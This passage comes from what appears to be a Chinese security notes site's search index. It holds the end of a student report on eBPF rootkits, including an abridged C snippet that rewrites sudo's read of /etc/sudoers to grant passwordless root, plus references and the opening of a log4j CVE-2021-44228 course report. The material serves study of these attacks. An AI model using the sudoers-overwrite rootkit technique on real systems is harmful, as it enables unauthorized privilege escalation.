\u00b7\u00b7\u00b7\n}\n</code></pre> <p>\u8fd0\u884c exechijack \u7a0b\u5e8f\u540e\uff0c\u6240\u6709\u65b0\u8fdb\u7a0b\u90fd\u4f1a\u88ab\u52ab\u6301\u8f6c\u800c\u8fd0\u884c /a\uff1a</p>"},{"location":"sec/syssec/project/#_7","title":"\u7528\u6237\u63d0\u6743","text":"<p>sudo \u547d\u4ee4\u5728\u6267\u884c\u65f6\u4f1a\u8bfb\u53d6 <code>/etc/sudoers</code> \u6587\u4ef6\uff0c\u67e5\u8be2\u5176\u4e2d\u7684\u6743\u9650\uff0c\u67e5\u8be2\u5f53\u524d\u6267\u884c\u547d\u4ee4\u7684\u7528\u6237\u662f\u5426\u6709 sudo \u6743\u9650\uff0c\u662f\u5426\u9700\u8981\u5bc6\u7801\u7b49\u3002\u6211\u4eec\u53ef\u4ee5\u62e6\u622a sudo \u5bf9 <code>/etc/sudoers</code> \u6587\u4ef6\u7684\u8bfb\u53d6\uff0c\u5e76\u7528 <code>ALL=(ALL:ALL) NOPASSWD:ALL #</code> \u8986\u76d6\u7b2c\u4e00\u884c\uff0c\u4f7f sudo \u8ba4\u4e3a\u8be5\u7528\u6237\u53ef\u4ee5\u4e0d\u9700\u8981\u5bc6\u7801\u6267\u884c sudo \u547d\u4ee4\uff0c\u4ece\u800c\u5b9e\u73b0\u7528\u6237\u63d0\u6743\u3002</p> <pre><code>SEC(\"tp/syscalls/sys_exit_read\")\nint handle_read_exit(struct trace_event_raw_sys_exit *ctx) {\n    \u00b7\u00b7\u00b7     // \u5199\u5165\u7528\u6237\u540d\n    sprintf(skel-&gt;rodata-&gt;payload, \"%s ALL=(ALL:ALL) NOPASSWD:ALL #\", env.username); \n    skel-&gt;rodata-&gt;payload_len = strlen(skel-&gt;rodata-&gt;payload);\n    \u00b7\u00b7\u00b7     // \u4fee\u6539 /etc/sudoers \u6587\u4ef6\u5185\u5bb9\uff0c\u5e76\u5728\u4fee\u6539\u5185\u5bb9\u540e\u52a0\u4e0a # \u6ce8\u91ca\n    char local_buff[max_payload_len] = { 0x00 };\n    bpf_probe_read(&amp;local_buff, max_payload_len, (void*)buff_addr);\n    for (unsigned int i = 0; i &lt; max_payload_len; i++) {\n        if (i &gt;= payload_len) { local_buff[i] = '#'; }\n        else { local_buff[i] = payload[i]; }\n    }\n    // \u5199\u5165\u4fee\u6539\u540e\u7684\u5185\u5bb9\n    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);\n    \u00b7\u00b7\u00b7\n}\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5148\u5c1d\u8bd5\u8fdb\u884c <code>sudo ls</code>\uff0c\u53ef\u89c1\u4f4e\u6743\u9650\u7528\u6237\u65e0\u6cd5\u4f7f\u7528 sudo \u547d\u4ee4\uff1a</p> <p>\u7136\u540e\u8fd0\u884c\u4e86 sudoadd \u7a0b\u5e8f\u540e\uff0c\u5c31\u53ef\u4ee5\u6267\u884c sudo \u547d\u4ee4\u4e86\uff1a</p>"},{"location":"sec/syssec/project/#_8","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7\u4ee5\u4e0a\u5bf9\u4e8e eBPF \u5185\u6838\u6f0f\u6d1e\u4ee5\u53ca eBPF rootkit \u7684\u5206\u6790\u53ef\u4ee5\u770b\u51fa\uff0ceBPF \u6280\u672f\u5728\u4e3a Linux \u5185\u6838\u5f15\u5165\u4e86\u4e30\u5bcc\u53ef\u6269\u5c55\u7684\u5b50\u7cfb\u7edf\u529f\u80fd\u7684\u540c\u65f6\uff0c\u4e5f\u5f15\u5165\u4e86\u5f88\u5927\u7684\u5b89\u5168\u98ce\u9669\u3002eBPF \u7a0b\u5e8f\u53ef\u4ee5\u5728\u5185\u6838\u6001\u6267\u884c\uff0c\u53ef\u4ee5\u8bbf\u95ee\u5185\u6838\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u52ab\u6301\u7cfb\u7edf\u8c03\u7528\uff0c\u53ef\u4ee5\u9690\u85cf\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u52ab\u6301\u65b0\u5efa\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u63d0\u6743\u7b49\uff0c\u8fd9\u4e9b\u529f\u80fd\u90fd\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u4e86\u5f88\u5927\u7684\u7a7a\u95f4\u3002</p> <p>\u901a\u8fc7\u5bf9\u4e8e eBPF \u73b0\u6709\u7684 CVE \u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\uff0c\u6211\u4eec\u4e5f\u5f97\u5230\u4e86\u5927\u90e8\u5206\u6f0f\u6d1e\u51fa\u73b0\u4e8e verifier \u4e0a\u7684\u7ed3\u8bba\uff0c\u6240\u4ee5\u4e3a\u4e86\u63d0\u9ad8 verifier \u5b89\u5168\u6027\uff0c\u6211\u4eec\u8981\u5728\u589e\u52a0 verifier \u529f\u80fd\u7684\u540c\u65f6\uff0c\u589e\u52a0\u5bf9\u4e8e verifier \u4ee3\u7801\u7684\u5ba1\u8ba1\u548c fuzz \u6d4b\u8bd5\uff0c\u5c3d\u91cf\u51cf\u5c11 verifier \u672c\u8eab\u51fa\u73b0\u6f0f\u6d1e\u7684\u53ef\u80fd\u3002</p> <p>\u540c\u65f6\u5bf9\u4e8e eBPF rootkit \u7684\u5a01\u80c1\uff0c\u4e00\u65b9\u9762\u53ef\u4ee5\u589e\u5f3a\u5bf9\u4e8e bpf \u7cfb\u7edf\u8c03\u7528\u4ee5\u53ca eBPF \u7a0b\u5e8f\u6267\u884c\u7684\u66f4\u591a\u6743\u9650\u68c0\u67e5\uff0c\u53e6\u4e00\u65b9\u9762\u201c\u89e3\u94c3\u8fd8\u9700\u7cfb\u94c3\u4eba\u201d\uff0c\u867d\u7136 eBPF rootkit \u96be\u4ee5\u901a\u8fc7\u5df2\u6709\u624b\u6bb5\u63a2\u6d4b\uff0c\u4f46\u662f\u5374\u53ef\u4ee5\u901a\u8fc7 eBPF \u7a0b\u5e8f\u6765\u5bfb\u627e eBPF rootkit \u5b58\u5728\u7684\u86db\u4e1d\u9a6c\u8ff9\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5e7f\u6cdb\u7684\u63a2\u6d4b\u5176\u4ed6 rootkit \u7684\u5b58\u5728\uff0c\u5b9e\u73b0\u5185\u6838\u7684\u4fdd\u62a4\uff0c\u4f46\u8fd9\u5c31\u4e0d\u662f\u672c\u6587\u7684\u91cd\u70b9\u4e86\u3002</p> <p>\u603b\u7ed3\u4e00\u4e0b\uff0c\u672c\u6587\u9996\u5148\u4ecb\u7ecd\u4e86 eBPF \u6280\u672f\u7684\u6765\u6e90\u4e0e\u53d1\u5c55\uff0c\u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e86 eBPF \u6280\u672f\u7684\u57fa\u672c\u539f\u7406\u548c\u5b89\u5168\u8bbe\u8ba1\uff0c\u7136\u540e\u6211\u4eec\u5206\u6790\u4e86\u51e0\u4e2a eBPF \u4e2d\u51fa\u73b0\u7684\u4e25\u91cd\u63d0\u6743 CVE \u6f0f\u6d1e\u7684\u539f\u7406\uff0c\u5e76\u8be6\u7ec6\u5206\u6790\u4e86 CVE-2020-8835 \u6f0f\u6d1e\u7684\u63d0\u6743\u5229\u7528\u8fc7\u7a0b\uff0c\u518d\u5206\u6790\u4e86\u5176\u4ed6 eBPF \u5386\u53f2 CVE \u7684\u6f0f\u6d1e\u4f4d\u7f6e\u5206\u5e03\u3002\u53e6\u4e00\u65b9\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86 eBPF rootkit \u7684\u539f\u7406\uff0c\u590d\u73b0\u4e86 bad-bpf rootkit \u5305\u4e2d\u7684 pidhide\u3001exechijack\u3001sudoadd \u529f\u80fd\uff0c\u5c55\u793a\u4e86 eBPF rootkit \u7684\u5371\u5bb3\u6027\uff0c\u5e76\u603b\u7ed3\u4e86 eBPF \u76f8\u5173\u7684\u5b89\u5168\u53d1\u5c55\u3002</p>"},{"location":"sec/syssec/project/#_9","title":"\u53c2\u8003\u6587\u732e\u53ca\u8d44\u6599","text":"<ol> <li>MCCANNE S, JACOBSON V. The BSD packet filter: a new architecture for user-level packet capture[C]//Proceedings of the USENIX Winter 1993 Conference Proceedings on USENIX Winter 1993 Conference Proceedings. USA: USENIX Association, 1993: 2[2024-06-13].</li> <li>MOHAMED M H N, WANG X, RAVINDRAN B. Understanding the Security of Linux eBPF Subsystem[C/OL]//Proceedings of the 14th ACM SIGOPS Asia-Pacific Workshop on Systems. New York, NY, USA: Association for Computing Machinery, 2023: 87-92[2024-06-14]. https://dl.acm.org/doi/10.1145/3609510.3609822.</li> <li>CASSAGNES C, TRESTIOREANU L, JOLY C, \u7b49. The rise of eBPF for non-intrusive performance monitoring[C/OL]//NOMS 2020 - 2020 IEEE/IFIP Network Operations and Management Symposium. 2020: 1-7[2024-05-08]. https://ieeexplore.ieee.org/document/9110434.</li> <li>HEDAM N. eBPF - From a Programmer\u2019s Perspective[C/OL]. 2021[2024-05-08]. https://www.semanticscholar.org/paper/eBPF-From-a-Programmer%E2%80%99s-Perspective-Hedam/fa841bd12df684991c5e0273bf7befd997131bd0.</li> <li>SHARAF H, AHMAD I, DIMITRIOU T. Extended Berkeley Packet Filter: An Application Perspective[J/OL]. IEEE Access, 2022, 10: 126370-126393. https://doi.org/10.1109/ACCESS.2022.3226269.</li> <li>NELSON L, GEFFEN J V, TORLAK E, \u7b49. Specification and verification in the field: Applying formal methods to {BPF} just-in-time compilers in the Linux kernel[C/OL]//14th USENIX Symposium on Operating Systems Design and Implementation (OSDI 20). 2020: 41-61[2024-05-08]. https://www.usenix.org/conference/osdi20/presentation/nelson.</li> <li>Introduction and practice of eBPF[EB/OL]. (2022-04-13)[2024-06-14]. https://www.sobyte.net/post/2022-04/ebpf/.</li> <li>Dive into BPF: a list of reading material[EB/OL]. (2016-07-01)[2024-06-14]. https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/.</li> <li>What is eBPF? An Introduction and Deep Dive into the eBPF Technology[EB/OL]. [2024-06-14]. https://ebpf.io/what-is-ebpf/.</li> <li>NVD - CVE-2020-8835[EB/OL]. [2024-06-14]. https://nvd.nist.gov/vuln/detail/CVE-2020-8835.</li> <li>Zero Day Initiative \u2014 CVE-2020-8835: Linux Kernel Privilege Escalation via Improper eBPF Program Verification[EB/OL]. [2024-06-14]. https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification.</li> <li>CVE-2020-8835\uff1aeBPF verifier \u6574\u6570\u622a\u65ad\u5bfc\u81f4\u8d8a\u754c\u8bfb\u5199 - bsauce[EB/OL]. [2024-06-15]. https://www.cnblogs.com/bsauce/p/14123111.html.  </li> <li>BSAUCE. bsauce/kernel-exploit-factory[CP/OL]. (2024-06-14)[2024-06-15]. https://github.com/bsauce/kernel-exploit-factory.  </li> <li>NVD - CVE-2020-27194[EB/OL]. [2024-06-14]. https://nvd.nist.gov/vuln/detail/CVE-2020-27194.</li> <li>Fuzzing for eBPF JIT bugs in the Linux kernel[EB/OL]//Simon Scannell. (2020-11-01)[2024-06-14]. https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/.</li> <li>CVE-2020-27194\uff1aLinux Kernel eBPF\u6a21\u5757\u63d0\u6743\u6f0f\u6d1e\u7684\u5206\u6790\u4e0e\u5229\u7528 - 360CERT[EB/OL]. [2024-06-14]. https://cert.360.cn/report/detail?id=534ffa63f950368b6741a1781173b242.</li> <li>NVD - CVE-2021-3490[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/detail/CVE-2021-3490.</li> <li>Kernel Pwning with eBPF - a Love Story - chompie at the bits[EB/OL]. [2024-06-15]. https://chomp.ie/Blog+Posts/Kernel+Pwning+with+eBPF+-+a+Love+Story.</li> <li>CHOMPIE. chompie1337/Linux_LPE_eBPF_CVE-2021-3490[CP/OL]. (2024-06-07)[2024-06-15]. https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490.</li> <li>CVE-2021-3490 eBPF 32\u4f4d\u8fb9\u754c\u8ba1\u7b97\u9519\u8bef\u6f0f\u6d1e\u5229\u7528\u5206\u6790-\u5b89\u5168\u5ba2[EB/OL]. [2024-06-15]. https://www.anquanke.com/post/id/251933.</li> <li>NVD - CVE-2022-23222[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/detail/CVE-2022-23222.</li> <li>oss-security - Re: Linux Kernel eBPF Improper Input Validation Vulnerability[EB/OL]. [2024-06-15]. https://www.openwall.com/lists/oss-security/2022/01/18/2.</li> <li>TR3E. cve-2022-23222-linux-kernel-ebpf-lpe[EB/OL]. [2024-06-15]. https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt.</li> <li>TR3E. tr3ee/CVE-2022-23222[CP/OL]. (2024-05-15)[2024-06-15]. https://github.com/tr3ee/CVE-2022-23222.</li> <li>MEANWHILE. Linux\u5185\u6838eBPF\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u590d\u73b0(CVE-2022-23222)[EB/OL]//\u661f\u671f\u4e94\u5b9e\u9a8c\u5ba4. [2024-06-15]. https://mp.weixin.qq.com/s/QJz9so27ao4rmT1Sbp74KA</li> <li>NVD - CVE-2021-4204[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/detail/CVE-2021-4204.</li> <li>oss-security - Re: CVE-2021-4204: Linux Kernel eBPF Improper Input Validation Vulnerability[EB/OL]. [2024-06-15]. https://www.openwall.com/lists/oss-security/2022/01/18/1.</li> <li>TR3E. tr3ee/CVE-2021-4204[CP/OL]. (2024-02-23)[2024-06-15]. https://github.com/tr3ee/CVE-2021-4204.</li> <li>NVD - eBPF Search Results[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/search/results?isCpeNameSearch=false&amp;query=eBPF&amp;results_type=overview&amp;form_type=Basic&amp;search_type=all&amp;startIndex=0.</li> <li>JIA J, ZHU Y, WILLIAMS D, \u7b49. Programmable System Call Security with eBPF[M/OL]. arXiv, 2023[2024-06-15]. http://arxiv.org/abs/2302.10366.</li> <li>DEJAEGHERE J, GBADAMOSI B, PULLS T, \u7b49. Comparing Security in eBPF and WebAssembly[C/OL]//Proceedings of the 1st Workshop on eBPF and Kernel Extensions. New York, NY, USA: Association for Computing Machinery, 2023: 35-41[2024-06-14]. https://dl.acm.org/doi/10.1145/3609021.3609306.</li> <li>Linux\u4e2d\u57fa\u4e8eeBPF\u7684\u6076\u610f\u5229\u7528\u4e0e\u68c0\u6d4b\u673a\u5236 - \u7f8e\u56e2\u6280\u672f\u56e2\u961f[EB/OL]. [2024-05-08]. https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html.</li> <li>FOURNIER G, BAUBEAU S. With Friends like eBPF, who needs enemies\u202f?[J/OL]. (2021)[2024-05-08]. https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-With-Friends-Like-EBPF-Who-Needs-Enemies.pdf</li> <li>PAT_H/TO/FILE. pathtofile/bad-bpf[CP/OL]. (2024-06-03)[2024-06-16]. https://github.com/pathtofile/bad-bpf.</li> <li>TREMB1E. ebpf-rootkit-and-detection[EB/OL]//Tremb1e\u2019s Blog. (2022-04-17)[2024-06-16]. https://www.tremb1e.com/archives/ebpf-rootkit-and-detection.  </li> <li>DEF CON 29 - PatH - Warping Reality: Creating and Countering the Next Generation of Linux Rootkits - YouTube[EB/OL]. [2024-06-16]. https://www.youtube.com/watch?v=g6SKWT7sROQ.  </li> <li>DEF CON 29: Bad BPF - Warping reality using eBPF[EB/OL]//pat_h/to/file. (2021-08-01)[2024-06-16]. https://blog.tofile.dev/2021/08/01/bad-bpf.html.</li> </ol>"},{"location":"sec/vulns/log4j/","title":"log4j \u6f0f\u6d1e\u590d\u73b0","text":"<p> \u7ea6 2877 \u4e2a\u5b57  91 \u884c\u4ee3\u7801  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u7bc7\u662f\u6d59\u6c5f\u5927\u5b66 \u201c\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u7684\u8bfe\u7a0b\u62a5\u544a</p> <p>\u4ecb\u7ecd\u4e86 log4j \u53ca\u7531\u5176\u5f15\u53d1\u7684 CVE-2021-44228 \u6f0f\u6d1e\uff0c\u5e76\u4ece JNDI\u3001LDAP\u3001RMI\u3001log4j \u7b49\u65b9\u9762\u5206\u6790\u4e86\u8be5\u6f0f\u6d1e\u7684\u5177\u4f53\u539f\u7406\uff0c\u518d\u901a\u8fc7 LDAP\u3001RMI \u4e24\u79cd\u65b9\u5f0f\u672c\u5730\u590d\u73b0\u8be5\u6f0f\u6d1e\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u548c\u53cd\u5f39\u7ec8\u7aef\uff0c\u6700\u540e\u4ecb\u7ecd\u8be5\u6f0f\u6d1e\u7684\u4fee\u590d\u3002</p>"},{"location":"sec/vulns/log4j/#log4j_1","title":"log4j \u6f0f\u6d1e\u6982\u8ff0","text":""},{"location":"sec/vulns/log4j/#log4j_2","title":"log4j \u7b80\u4ecb","text":"<p>log4j \u662f Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u6e90 Java \u65e5\u5fd7\u6846\u67b6\u3002\u5b83\u63d0\u4f9b\u4e86\u4e30\u5bcc\u53ef\u6269\u5c55\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e0e\u8f93\u51fa\u529f\u80fd\uff0c\u53ef\u4ee5\u8f93\u51fa\u65e5\u5fd7\u5230\u4efb\u610f\u4f4d\u7f6e\u3001\u66f4\u6539\u65e5\u5fd7\u5185\u5bb9\u6837\u5f0f\u3001\u6307\u5b9a\u65e5\u5fd7\u7ea7\u522b\u5e76\u5206\u7ea7\u522b\u663e\u793a\u3001\u4ee5\u53ca\u5229\u7528 ${} \u8bed\u53e5\u8f93\u51fa\u52a8\u6001\u5185\u5bb9\u7b49\u3002</p> <p>\u968f\u7740\u6280\u672f\u53d1\u5c55\uff0c1.x \u7248\u672c\u7684 log4j \u9010\u6e10\u5728\u7ed3\u6784\u3001\u6027\u80fd\u4e0a\u88ab slf4j\u3001logback \u7b49\u65b0\u5174\u7684\u65e5\u5fd7\u6846\u67b6\u8d85\u8d8a\uff0cApache \u4e5f\u56e0\u6b64\u5bf9 log4j \u8fdb\u884c\u4e86\u4e00\u6b21\u91cd\u6784\u5347\u7ea7\uff0c\u53d1\u5e03\u4e86\u4f18\u5316\u4e86\u7ed3\u6784\u3001\u6027\u80fd\u7684 2.x \u7248\u672c log4j\uff08\u53c8\u540d log4j2\uff09\u3002log4j2 \u501f\u9274\u4e86 slf4j \u7684\u7ed3\u6784\u8bbe\u8ba1\uff0c\u5206\u4e3a\u4e86\u4e24\u90e8\u5206\uff1alog4j-api\u3001log4j-core\uff0c\u524d\u8005\u4ec5\u63d0\u4f9b\u63a5\u53e3\uff0c\u540e\u8005\u63d0\u4f9b\u5b9e\u73b0\u3002\u5305\u540d\u5206\u522b\u4e3a org.apache.logging.log4j \u548c org.apache.logging.log4j.core\u3002</p> <p>\u56e0\u4e3a log4j \u7684\u6613\u7528\u6027\uff0c\u4f17\u591a\u4ee5 Java \u4f5c\u4e3a\u540e\u7aef\u670d\u52a1\u8bed\u8a00\u7684\u7f51\u7edc\u5e94\u7528\u3001\u8f6f\u4ef6\u90fd\u5728\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u3002</p>"},{"location":"sec/vulns/log4j/#cve-2021-44228","title":"CVE-2021-44228","text":"<p>CVE-2021-44228 \u662f\u963f\u91cc\u4e91\u56e2\u961f\u5728 2021 \u5e74 11 \u6708 26 \u65e5\u63d0\u4ea4\u3001\u540c\u5e74 12 \u6708 9 \u65e5\u516c\u5f00\u7684\u5173\u4e8e log4j \u7684\u91cd\u5927\u6f0f\u6d1e\u3002\u5b83\u53ef\u4ee5\u5b9e\u73b0 RCE\uff08Remote Code Execution\uff0c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff09\uff0c\u4ece\u800c\u5371\u5bb3\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684 Java \u670d\u52a1\u5668\u7684\u5b89\u5168\u3002CVSS3.0\uff08\u901a\u7528\u6f0f\u6d1e\u8bc4\u5206\u7cfb\u7edf\uff09\u8bc4\u5206 10.0 \u5206\u3001\u8bc4\u7ea7 critical\u3002</p> <p>\u8be5\u6f0f\u6d1e\u5a01\u80c1\u7b49\u7ea7\u9ad8\u3001\u5f71\u54cd\u9762\u5e7f\u6cdb\u3001\u5229\u7528\u4ef7\u503c\u9ad8\u3001\u5229\u7528\u96be\u5ea6\u4f4e\uff0c\u53d7\u5230\u5e7f\u6cdb\u5173\u6ce8\u3002\u5e76\u4e14\u56e0\u4e3a log4j \u7684\u5e7f\u6cdb\u5e94\u7528\uff0c\u5305\u62ec\u82f9\u679c\u3001\u8c37\u6b4c\u3001\u767e\u5ea6\u3001Steam \u7b49\u5728\u5185\u7684\u5927\u578b\u4e92\u8054\u7f51\u4f01\u4e1a\u7684\u4ea7\u54c1\u4e5f\u90fd\u53d7\u5230\u8be5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002</p> <p>\u8be5\u6f0f\u6d1e\u7531 JNDI \u7279\u6027\u5f15\u8d77\uff0c\u5176\u5e76\u6ca1\u6709\u4fdd\u62a4\u901a\u8fc7 LDAP \u7b49\u67e5\u627e JNDI \u7684\u65b9\u5f0f\uff0c\u9020\u6210\u6f5c\u5728\u7684 RCE\u3002\u5f71\u54cd\u8303\u56f4\u4ece log4j \u7248\u672c 2.0-beta9 \u5f00\u59cb\u5230 2.15.0-rc1\uff0c\u5e76\u5728 2.15.0-rc2 \u7248\u672c\u4e2d\u5c06\u8fd9\u4e00\u884c\u4e3a\u9ed8\u8ba4\u5173\u95ed\uff0c\u5728 2.16.0 \u7248\u672c\u4e2d\u5b8c\u5168\u79fb\u9664\u3002</p>"},{"location":"sec/vulns/log4j/#log4j_3","title":"log4j \u6f0f\u6d1e\u539f\u7406","text":""},{"location":"sec/vulns/log4j/#jndi","title":"JNDI \u7b80\u4ecb","text":"<p>JNDI\uff08Java Naming and Directory Interface\uff0cJava \u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\uff09\u662f\u7528\u4e8e\u4ece Java \u5e94\u7528\u4e2d\u8bbf\u95ee\u540d\u79f0\u548c\u76ee\u5f55\u670d\u52a1\u7684\u4e00\u7ec4 API\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5c06\u540d\u79f0/\u76ee\u5f55\u4e0e\u5bf9\u8c61\u76f8\u5173\u8054\uff0c\u5e76\u63d0\u4f9b\u4e86\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u6765\u67e5\u627e\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002</p> <p>JNDI \u67b6\u6784\u5206\u4e3a\u4e09\u5c42\uff1a</p> <ul> <li>JNDI API\uff1a\u4e0e Java \u5e94\u7528\u7a0b\u5e8f\u901a\u4fe1\uff0c\u63d0\u4f9b\u7f16\u7a0b\u63a5\u53e3\uff0c\u9694\u79bb\u5e94\u7528\u4e0e\u6570\u636e\u6e90</li> <li>Naming Manager\uff1a\u547d\u540d\u670d\u52a1\u7ba1\u7406\u5668</li> <li>JNDI SPI\uff1a\u4e0e\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\uff08\u670d\u52a1\uff09\u76f8\u8fde\u63a5</li> </ul> <p>JNDI \u652f\u6301\u7684\u670d\u52a1\u6709\u5f88\u591a\uff0c\u6bd4\u5982 RMI\u3001LDAP\u3001DNS \u7b49\u670d\u52a1\u3002JNDI \u5c01\u88c5\u4e86\u8fd9\u4e9b\u670d\u52a1\uff0c\u4f7f\u5f97\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7684\u4ee3\u7801\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\uff08\u8c03\u7528\u5bb9\u5668\u73af\u5883\u7684 Context \u7684 lookup \u65b9\u6cd5\uff09</p>"},{"location":"sec/vulns/log4j/#rmi","title":"RMI \u7b80\u4ecb","text":"<p>RMI\uff08Remote Method Invocation\uff0c\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff09\u670d\u52a1\u63d0\u4f9b\u4e86\u4ece\u4e00\u4e2a JVM \u4e2d\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2a JVM \u5bf9\u8c61\u65b9\u6cd5\u7684\u65b9\u5f0f\u3002\u4e5f\u662f RPC\uff08Remote Procedure Calls\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u9762\u5411\u5bf9\u8c61\u7b49\u4ef7\u670d\u52a1\u3002\u5b83\u9700\u8981\u4e00\u4e2a Server \u7aef\u63d0\u4f9b RMI \u670d\u52a1\u548c\u4e00\u4e2a Client \u7aef\u8bbf\u95ee\u8fdc\u7a0b\u63d0\u4f9b\u7684 RMI \u670d\u52a1\u3002RMI \u670d\u52a1\u5206\u4e3a\u4e09\u5c42\uff1a</p> <ul> <li>\u5b58\u6839\u4e0e\u9aa8\u67b6<ul> <li>\u5b58\u6839\uff08Stub\uff09\uff1a\u4e0e Client \u7aef\u76f8\u8fde\uff0c\u662f\u8fdc\u7a0b\u5bf9\u8c61\u7684\u4ee3\u7406</li> <li>\u9aa8\u67b6\uff08Skeleton\uff09\uff1a\u4e0e Server \u7aef\u76f8\u8fde\uff0c\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5</li> </ul> </li> <li>\u8fdc\u7a0b\u5f15\u7528\u5c42\uff08Remote Reference Layer\uff09\uff1a\u7528\u6765\u5bfb\u627e\u901a\u4fe1\u5bf9\u8c61\u4ee5\u53ca\u901a\u8fc7 RMI Registry \u63d0\u4f9b\u547d\u540d\u670d\u52a1</li> <li>\u4f20\u8f93\u5c42\uff08Transport Layer\uff09\uff1a\u5728 Server \u4e0e Client \u7aef\u5efa\u7acb socket \u901a\u4fe1</li> </ul> <p>Server \u7aef\u5f00\u542f RMI \u670d\u52a1\u65f6\u5148\u521b\u5efa\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7136\u540e\u5411 registry \u6ce8\u518c\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7b49\u5f85\u8c03\u7528\u3002Client \u7aef\u8fdb\u884c RMI \u65f6\u8bbf\u95ee registry \u5f97\u5230\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\uff0c\u518d\u901a\u8fc7\u5b58\u6839\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\uff0c\u5b58\u6839\u5e8f\u5217\u5316\u8c03\u7528\u540e\u4e0e\u9aa8\u67b6\u901a\u4fe1\u4f7f\u9aa8\u67b6\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5b58\u6839\u518d\u53cd\u5e8f\u5217\u5316\u4ea4\u7ed9\u5ba2\u6237\u7aef\u3002</p>"},{"location":"sec/vulns/log4j/#ldap","title":"LDAP \u7b80\u4ecb","text":"<p>LDAP\uff08Lightweight Directory Access Protocol\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u3001\u4e2d\u7acb\u7684\u3001\u5de5\u4e1a\u6807\u51c6\u7684\u5e94\u7528\u534f\u8bae\uff0c\u901a\u8fc7 TCP/IP \u534f\u8bae\u63d0\u4f9b\u8bbf\u95ee\u63a7\u5236\u548c\u7ef4\u62a4\u5206\u5e03\u5f0f\u4fe1\u606f\u7684\u76ee\u5f55\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 LDAP \u534f\u8bae\u6765\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\uff0c\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u6811\u5f62\u7684\u6570\u636e\u5e93\u3002</p>"},{"location":"sec/vulns/log4j/#jndi_1","title":"JNDI \u6ce8\u5165\u539f\u7406","text":"<p>\u5982\u524d\u9762\u6240\u8bf4\uff0cJNDI \u5c01\u88c5\u4e86\u4e00\u4e9b\u670d\u52a1\uff0c\u5e76\u4e14\u901a\u8fc7 lookup \u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u8fc7 lookup(\"rmi://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee ip:port \u63d0\u4f9b\u7684 RMI \u670d\u52a1\uff0c\u901a\u8fc7 lookup(\"ldap://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee LDAP \u670d\u52a1\u3002</p> <p>JNDI \u7684\u76ee\u7684\u662f\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u83b7\u53d6\u5bf9\u8c61\uff0c\u800c\u8fdc\u7a0b\u8bfb\u53d6\u7684\u4e00\u822c\u662f\u7f16\u8bd1\u540e\u7684 .class \u6587\u4ef6\u6240\u4ee5\u5728 lookup \u65f6\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\uff0cJVM \u5c06\u5176\u52a0\u8f7d\u4e3a Java \u7c7b\u3002\u800c\u5f53 ClassLoader \u52a0\u8f7d .class \u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u8c03\u7528\u7c7b\u7684 clinit 